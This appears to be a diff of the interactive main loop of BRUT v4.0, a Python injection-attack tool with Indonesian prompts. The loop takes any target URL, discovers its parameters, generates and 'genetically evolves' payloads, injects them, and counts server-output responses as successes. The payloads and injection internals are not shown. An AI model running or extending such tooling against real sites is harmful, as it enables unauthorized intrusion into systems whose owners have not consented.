+            print(f"\n\n\033[31m[*]\033[0m Exiting..."); break
 
-        if not target:
-            continue
+        if not target: continue
         if target.lower() in ["/exit", "exit", "/quit", "quit"]:
-            print(f"\n\033[31m[*]\033[0m Exiting BRUT v4.0. Goodbye!")
-            break
+            print(f"\n\033[31m[*]\033[0m Goodbye!"); break
 
         if not target.startswith(("http://", "https://")):
             target = "http://" + target
 
         parsed = urlparse(target)
         if not parsed.netloc:
-            print(f"  \033[31m[!]\033[0m Target tidak valid: {target}")
-            continue
+            print(f"  \033[31m[!]\033[0m Target tidak valid"); continue
 
-        # ====== PIPELINE ======
         pipeline = BRUTPipeline(target)
-
-        # Phase 1: Deep Discovery
         params = pipeline.phase1_discover()
 
         if not params:
-            print(f"\n  \033[31m[!]\033[0m Tidak ada parameter yang ditemukan di {target}")
-            continue
+            print(f"\n  \033[31m[!]\033[0m Tidak ada parameter ditemukan"); continue
 
-        # Display results
         print(f"\n\033[1;32m{'='*60}")
         print(f"  DEEP PARAMETER DISCOVERY RESULTS")
         print(f"{'='*60}\033[0m")
-        print(f"  Total parameter ditemukan: \033[1;37m{len(params)}\033[0m\n")
+        print(f"  Total: \033[1;37m{len(params)}\033[0m\n")
 
-        by_location = defaultdict(list)
-        for p in params:
-            by_location[p.location].append(p)
-
-        for loc, p_list in by_location.items():
-            print(f"  \033[36m[{loc.upper()}]\033[0m ({len(p_list)})")
-            for p in p_list[:8]:
+        by_loc = defaultdict(list)
+        for p in params: by_loc[p.location].append(p)
+        for loc, plist in by_loc.items():
+            print(f"  \033[36m[{loc.upper()}]\033[0m ({len(plist)})")
+            for p in plist[:8]:
                 extra = ""
                 if p.context.get("reason"):
                     extra = f" \033[90m({p.context['reason'][:30]})\033[0m"
                 elif p.context.get("source"):
                     extra = f" \033[90m({p.context['source']})\033[0m"
                 print(f"    • \033[37m{p.name:<25}\033[0m [{p.method}] {p.url[:50]}{extra}")
-            if len(p_list) > 8:
-                print(f"    ... dan {len(p_list)-8} lainnya")
+            if len(plist) > 8:
+                print(f"    ... dan {len(plist)-8} lainnya")
             print()
 
-        # Confirm
         try:
-            confirm = input(f"  \033[1;33mLanjut ke tahap injection? [Y/N] >> \033[0m").strip().lower()
-        except (EOFError, KeyboardInterrupt):
-            break
-
+            confirm = input(f"  \033[1;33mLanjut injection? [Y/N] >> \033[0m").strip().lower()
+        except (EOFError, KeyboardInterrupt): break
         if confirm not in ["y", "yes", "ya", ""]:
-            print(f"  \033[33m[*]\033[0m Dibatalkan.")
-            continue
+            print(f"  \033[33m[*]\033[0m Dibatalkan."); continue
 
-        # Phase 2: Payload count
         print(f"\n\033[1;33m{'─'*60}\033[0m")
-        print(f"  \033[1;37mJumlah Payload Variant\033[0m")
-        print(f"  • Angka (contoh: 100, 1000, 5000)")
-        print(f"  • \033[35mmax\033[0m = unlimited, berhenti saat temukan success")
+        print(f"  \033[1;37mJumlah Payload Variant\033[0m (angka / max)")
+        print(f"  \033[90mGenetic evolution akan otomatis berjalan setiap 100 test\033[0m")
         print(f"\033[1;33m{'─'*60}\033[0m")
 
         try:
             count_input = input(f"\n  \033[1;36mBRUT\033[0m \033[33m>> \033[0m").strip().lower()
-        except (EOFError, KeyboardInterrupt):
-            break
+        except (EOFError, KeyboardInterrupt): break
 
         max_mode = False
         if count_input == "max":
-            max_mode = True
-            payload_count = 500
-            print(f"  \033[35m[*]\033[0m MAX mode aktif — berhenti saat sukses")
+            max_mode = True; payload_count = 500
+            print(f"  \033[35m[*]\033[0m MAX mode aktif")
         else:
             try:
                 payload_count = int(count_input)
-                if payload_count <= 0:
-                    raise ValueError
+                if payload_count <= 0: raise ValueError
             except ValueError:
-                print(f"  \033[31m[!]\033[0m Input tidak valid, gunakan angka atau 'max'")
-                continue
+                print(f"  \033[31m[!]\033[0m Input tidak valid"); continue
 
-        # Generate
-        print(f"\n\033[36m[*]\033[0m Generating {payload_count} payload variants dari nol...")
+        print(f"\n\033[36m[*]\033[0m Generating {payload_count} payloads (grammar-validated)...")
         payloads = pipeline.phase2_generate(payload_count)
         print(f"  \033[32m[+]\033[0m Generated {len(payloads)} unique payloads")
-
         by_cat = Counter(p["category"] for p in payloads)
-        by_tier = Counter(p["length_tier"] for p in payloads)
-        by_strat = Counter(p["strategy"] for p in payloads)
-        print(f"  By category : {dict(by_cat)}")
-        print(f"  By tier     : {dict(by_tier)}")
-        print(f"  Strategies  : {len(by_strat)} unique")
+        print(f"  Categories: {dict(by_cat)}")
+        print(f"  \033[1;35mGenetic population initialized: {len(payloads)}\033[0m")
 
-        # Phase 3: Injection
         pipeline.phase3_inject(max_mode=max_mode)
 
-        # Phase 3.5: Advanced retry
         success_count = len([r for r in pipeline.results if r.response_type == "server_output"])
         if success_count == 0 and not max_mode:
-            print(f"\n\033[33m[*]\033[0m No success yet — ML evolving payloads...")
             pipeline.phase3_advanced_retry()
 
-        # Phase 4: Save
         txt_path, json_path = pipeline.phase4_save()
-
-        # Summary
         pipeline.print_summary()
+        print(f"\n  \033[32m[+]\033[0m Report: {txt_path}")
+        print(f"          {json_path}")
 
-        print(f"\n  \033[32m[+]\033[0m Report saved:")
-        print(f"      TXT : {txt_path}")
-        print(f"      JSON: {json_path}")
-
-        # Cleanup
         pipeline.injector.close()
 
 
-# ============================================================
-# ENTRY POINT
-# ============================================================
 if __name__ == "__main__":
     try:
         interactive_main()
     except KeyboardInterrupt:
-        print(f"\n\n\033[31m[*]\033[0m Interrupted by user. Exiting...")
-        sys.exit(0)
+        print(f"\n\n\033[31m[*]\033[0m Interrupted."); sys.exit(0)
     except Exception as e:
         print(f"\n\033[31m[FATAL]\033[0m {e}")
         traceback.print_exc()
